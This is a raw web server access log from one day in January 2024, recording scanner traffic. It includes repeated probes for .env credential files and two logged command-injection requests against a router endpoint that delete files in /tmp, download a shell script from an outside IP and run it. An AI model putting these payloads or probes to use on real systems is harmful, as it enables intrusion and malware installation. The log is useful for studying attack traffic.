185.254.196.173 - - [23/Jan/2024:16:24:40 +0000] "POST / HTTP/1.1" 200 3979
139.162.84.205 - - [23/Jan/2024:16:41:13 +0000] "GET / HTTP/1.0" 200 3979
185.254.196.173 - - [23/Jan/2024:16:48:10 +0000] "GET /.env HTTP/1.1" 404 755
185.254.196.173 - - [23/Jan/2024:16:48:10 +0000] "POST / HTTP/1.1" 200 3979
135.125.217.54 - - [23/Jan/2024:17:02:29 +0000] "GET /.env HTTP/1.1" 404 755
135.125.217.54 - - [23/Jan/2024:17:02:29 +0000] "POST / HTTP/1.1" 200 3979
104.248.229.49 - - [23/Jan/2024:17:03:53 +0000] "GET /aaa9 HTTP/1.1" 404 755
104.248.229.49 - - [23/Jan/2024:17:03:54 +0000] "GET /aab8 HTTP/1.1" 404 755
104.248.229.49 - - [23/Jan/2024:17:03:56 +0000] "GET / HTTP/1.1" 200 3979
185.180.143.71 - - [23/Jan/2024:17:12:13 +0000] "GET / HTTP/1.1" 200 3979
185.180.143.71 - - [23/Jan/2024:17:12:14 +0000] "GET /cf_scripts/scripts/ajax/ckeditor/ckeditor.js HTTP/1.1" 404 811
87.236.176.168 - - [23/Jan/2024:17:38:57 +0000] "GET / HTTP/1.1" 200 3979
185.224.128.191 - - [23/Jan/2024:17:42:06 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd%20%2Ftmp%3B%20rm%20-rf%20%2A%3B%20wget%20http%3A%2F%2F104.168.5.4%2Ftenda.sh%3B%20chmod%20777%20tenda.sh%3B.%2Ftenda.sh) HTTP/1.1" 404 789
185.224.128.191 - - [23/Jan/2024:17:42:06 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd%20%2Ftmp%3B%20rm%20-rf%20%2A%3B%20wget%20http%3A%2F%2F104.168.5.4%2Ftenda.sh%3B%20chmod%20777%20tenda.sh%3B.%2Ftenda.sh) HTTP/1.1" 404 789
120.36.17.230 - - [23/Jan/2024:17:47:38 +0000] "GET / HTTP/1.0" 200 3979
221.213.12.27 - - [23/Jan/2024:17:47:40 +0000] "-" 400 2187
171.37.37.54 - - [23/Jan/2024:17:47:40 +0000] "-" 400 2169
221.213.12.163 - - [23/Jan/2024:17:47:48 +0000] "USER anonymous " 400 795
185.224.128.191 - - [23/Jan/2024:18:02:01 +0000] "GET / HTTP/1.1" 200 3979
185.254.196.173 - - [23/Jan/2024:18:12:16 +0000] "GET /.env HTTP/1.1" 404 755
185.254.196.173 - - [23/Jan/2024:18:12:17 +0000] "POST / HTTP/1.1" 200 3979
135.125.217.54 - - [23/Jan/2024:18:34:05 +0000] "GET /.env HTTP/1.1" 404 755
135.125.217.54 - - [23/Jan/2024:18:34:05 +0000] "POST / HTTP/1.1" 200 3979
205.210.31.6 - - [23/Jan/2024:18:35:28 +0000] "GET / HTTP/1.1" 200 3979
221.126.232.61 - - [23/Jan/2024:18:43:46 +0000] "-" 400 2211
183.136.225.9 - - [23/Jan/2024:18:58:13 +0000] "GET / HTTP/1.1" 200 3979
183.136.225.9 - - [23/Jan/2024:18:58:14 +0000] "GET / HTTP/1.1" 200 3979
183.136.225.9 - - [23/Jan/2024:18:58:14 +0000] "GET /favicon.ico HTTP/1.1" 404 762
183.136.225.9 - - [23/Jan/2024:18:58:14 +0000] "GET /robots.txt HTTP/1.1" 404 761
183.136.225.9 - - [23/Jan/2024:18:58:15 +0000] "GET /js/swipebox.js HTTP/1.1" 200 1050
185.254.196.173 - - [23/Jan/2024:19:06:28 +0000] "GET /.env HTTP/1.1" 404 755
185.254.196.173 - - [23/Jan/2024:19:06:28 +0000] "POST / HTTP/1.1" 200 3979
192.241.222.99 - - [23/Jan/2024:19:11:31 +0000] "GET / HTTP/1.1" 200 3979
78.153.140.177 - - [23/Jan/2024:19:20:46 +0000] "GET /.env HTTP/1.1" 404 755
78.153.140.177 - - [23/Jan/2024:19:20:46 +0000] "-" 400 2171
185.254.196.173 - - [23/Jan/2024:19:45:41 +0000] "GET /.env HTTP/1.1" 404 755
185.254.196.173 - - [23/Jan/2024:19:45:42 +0000] "POST / HTTP/1.1" 200 3979
135.125.217.54 - - [23/Jan/2024:19:57:07 +0000] "GET /.env HTTP/1.1" 404 755
135.125.217.54 - - [23/Jan/2024:19:57:08 +0000] "POST / HTTP/1.1" 200 3979
198.98.54.50 - - [23/Jan/2024:20:04:48 +0000] "GET /manager/html HTTP/1.1" 403 3446
46.174.191.29 - - [23/Jan/2024:20:23:49 +0000] "GET / HTTP/1.0" 200 3979
205.210.31.205 - - [23/Jan/2024:20:34:26 +0000] "-" 400 2229
205.210.31.205 - - [23/Jan/2024:20:34:26 +0000] "-" 400 3419
139.162.84.205 - - [23/Jan/2024:20:40:30 +0000] "GET / HTTP/1.0" 200 3979
185.254.196.186 - - [23/Jan/2024:20:44:12 +0000] "GET /.env HTTP/1.1" 404 755
185.254.196.186 - - [23/Jan/2024:20:44:13 +0000] "POST / HTTP/1.1" 200 3979
3.110.178.166 - - [23/Jan/2024:21:09:26 +0000] "-" 400 2211
3.110.178.166 - - [23/Jan/2024:21:09:27 +0000] "-" 400 3075
3.110.178.166 - - [23/Jan/2024:21:09:27 +0000] "GET / HTTP/1.1" 200 3979
3.110.178.166 - - [23/Jan/2024:21:09:27 +0000] "GET /favicon.ico HTTP/1.1" 404 762
135.125.217.54 - - [23/Jan/2024:21:20:16 +0000] "GET /.env HTTP/1.1" 404 755
135.125.217.54 - - [23/Jan/2024:21:20:17 +0000] "POST / HTTP/1.1" 200 3979
172.206.218.202 - - [23/Jan/2024:21:20:59 +0000] "GET /.env HTTP/1.1" 404 755
172.206.218.202 - - [23/Jan/2024:21:21:00 +0000] "POST / HTTP/1.1" 200 3979
146.19.24.23 - - [23/Jan/2024:21:35:08 +0000] "GET / HTTP/1.1" 200 3979
66.245.193.100 - - [23/Jan/2024:21:37:50 +0000] "GET / HTTP/1.1" 200 3979
66.245.193.100 - - [23/Jan/2024:21:37:51 +0000] "GET /_profiler/empty/search/results HTTP/1.1" 404 793
198.98.54.50 - - [23/Jan/2024:22:02:07 +0000] "GET /manager/html HTTP/1.1" 403 3446
185.254.196.173 - - [23/Jan/2024:22:05:25 +0000] "GET /.env HTTP/1.1" 404 755
185.254.196.173 - - [23/Jan/2024:22:05:26 +0000] "POST / HTTP/1.1" 200 3979
185.254.196.186 - - [23/Jan/2024:22:14:04 +0000] "GET /.env HTTP/1.1" 404 755
185.254.196.186 - - [23/Jan/2024:22:14:05 +0000] "POST / HTTP/1.1" 200 3979
18.222.105.145 - - [23/Jan/2024:22:23:12 +0000] "GET / HTTP/1.1" 200 3979
18.222.105.145 - - [23/Jan/2024:22:23:32 +0000] "GET /js/swipebox.js HTTP/1.1" 200 1050
18.222.105.145 - - [23/Jan/2024:22:23:46 +0000] "GET /js/swipebox.js HTTP/1.1" 200 1050
135.125.217.54 - - [23/Jan/2024:22:37:00 +0000] "GET /.env HTTP/1.1" 404 755
135.125.217.54 - - [23/Jan/2024:22:37:00 +0000] "POST / HTTP/1.1" 200 3979
135.125.217.54 - - [23/Jan/2024:23:30:26 +0000] "GET /.env HTTP/1.1" 404 755
135.125.217.54 - - [23/Jan/2024:23:30:26 +0000] "POST / HTTP/1.1" 200 3979
185.254.196.173 - - [23/Jan/2024:23:43:48 +0000] "GET /.env HTTP/1.1" 404 755
